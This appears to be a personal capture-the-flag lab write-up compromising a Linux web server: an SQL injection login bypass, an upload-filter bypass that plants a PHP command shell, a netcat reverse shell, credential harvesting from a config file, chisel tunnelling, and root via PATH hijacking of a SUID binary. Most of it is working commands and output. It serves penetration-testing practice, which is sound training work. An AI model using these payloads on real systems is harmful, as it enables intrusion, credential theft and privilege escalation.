### Webadmin
* http://10.129.51.88/upload.php need auth
* http://10.129.51.88/login.php
* https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

admin' or '1'='1

### Foothold
* http://10.129.51.88/images/uploads/7.jpg <- where the uploaded file goes

##### Sorry, only JPG, JPEG & PNG files are allowed.
PS, the writeup mentioned evil.php.jpg worked just fine. I didn't test that.

```bash
cp php-reverse-shell.php evil.php%00.png
```

`evil.php%00.png` -> Server: What're you trying to do here?

##### Magic Bytes
1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#upload-tricks

It doesn't work out after I put them directly above the php shell

2. https://book.hacktricks.xyz/pentesting-web/file-upload#magic-header-bytes

Let's do it with burp: `Content-Type: application/x-php` is necessary no mater method A or B

##### Method A: Use a legit img with burp
```bash
------WebKitFormBoundaryO4Ah2DIFGOp8Tlpk
Content-Disposition: form-data; name="image"; filename="test11.php%00.png"
Content-Type: application/x-php

ÿØÿà ..*GGIEGULXY # Try to use a legit img first. Then LEFT a full line here to help you bypass second layer magic byte check.

<?php system($_GET["cmd"]);?>

# If that still doesn't work, try put the payload into middle of an image
```

##### Method B: Hex it in
* https://en.wikipedia.org/wiki/List_of_file_signatures

```txt
89 50 4E 47 0D 0A 1A 0A -> 89504E470D0A1A0A
```

ChatGPT is sick
```bash
echo '89504E470D0A1A0A' | xxd -r -p | cat - evil.php%00.png > temp && mv temp evil.php%00.png

echo '89504E470D0A1A0A' | xxd -r -p | sed '1s/^/$(cat)\n/' > file
echo '89504E470D0A1A0A' | xxd -r -p | awk 'BEGIN{getline c < "file"} {print $0 ORS c}' > file
```

##### What now? After file uploaded
File not found even it says upload successfully. Try encode the url `evil.php%00.png` -> `evil.php%2500.png`

* http://10.129.51.88/images/uploads/evil.php%2500.png <- It works

```bash
nc -lvnp 7890
listening on [any] 7890 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.51.88] 42982
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:30:00 up  4:58,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

##### Stable shell
* https://github.com/A1vinSmith/OSCP-PWK/wiki/Python#get-a-stable-shell

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/$ ^Z
[1]  + 80503 suspended  nc -lvnp 7890
❯ stty raw -echo;fg
[1]  + 80503 continued  nc -lvnp 7890
                                     stty rows 38 columns 172
www-data@ubuntu:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Lateral Movement
##### Enumeration
```bash
www-data@ubuntu:/var/www/Magic$ cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```
Althogh, no mysql installed on victim. Need to pivot.

##### Try to SSH as www-data, failed
```bash victim
www-data@ubuntu:/var/www$ cd Magic
www-data@ubuntu:/var/www/Magic$ mkdir .ssh

ssh-keygen -q -t rsa -N '' -C 'pam'
/var/www/Magic/.ssh/id_rsa

cp .ssh/id_rsa.pub .ssh/authorized_keys
chmod 600 .ssh/authorized_keys 
```

```bash attacker
ssh -i /tmp/key www-data@10.129.223.83 # X
ssh Magic@10.129.223.83 -i key # X
```

##### Chisel like always
```bash
./chisel server -p 8000 --reverse
./chisel client 10.10.16.9:8000 R:3306:127.0.0.1:3306

mysql -h 127.0.0.1 -u theseus -D Magic -piamkingtheseus # 3306 is default
```

admin
Th3s3usW4sK1ng

`su theseus`

##### mysqldump as alternative
* https://0xdf.gitlab.io/2020/08/22/htb-magic.html#database-dump

```bash
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic

www-data@ubuntu:/var/www/Magic$ mysqldump --user=theseus --password=iamkingtheseus --host=localhost database Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: database
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
mysqldump: Got error: 1044: Access denied for user 'theseus'@'localhost' to database 'database' when selecting the database
www-data@ubuntu:/var/www/Magic$ mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-10-17 18:06:56
```

##### theseus get
```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$ whoami
theseus
```

### Root
##### Enum
```bash
theseus@ubuntu:/var/www/Magic$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping

theseus@ubuntu:/var/www/Magic$ strings /bin/sysinfo
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
```

##### Let's do it with two binary hijacking
Since it's interesting that picked up by at least two tools

```bash
echo "/bin/bash" > lshw
chmod +x lshw
PATH=.:$PATH /bin/sysinfo
```

```bash
theseus@ubuntu:/var/www/Magic$ echo "/bin/bash" > free
bash: free: Permission denied
theseus@ubuntu:/var/www/Magic$ cd /tmp
theseus@ubuntu:/tmp$ echo "/bin/bash" > free
theseus@ubuntu:/tmp$ chmod +x free
theseus@ubuntu:/tmp$ ls -lh /bin/sysinfo
-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo
theseus@ubuntu:/tmp$ PATH=.:$PATH /bin/sysinfo
```

##### Get the buggy flag
There is a bug you might have to exit root to read the flag
```bash
root@ubuntu:/tmp# id
root@ubuntu:/tmp# cat /root/proof.txt
cat: /root/proof.txt: No such file or directory
root@ubuntu:/tmp# cat /root/root.txt
root@ubuntu:/root# exit
exit
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
```

### Beyond Root
* https://0xdf.gitlab.io/2020/08/22/htb-magic.html#beyond-root

```php
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

```php .htaccess
<FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">
SetHandler application/x-httpd-php
</FilesMatch>
<Files ~ "\.(sh|sql)">
   order deny,allow
   deny from all
   ```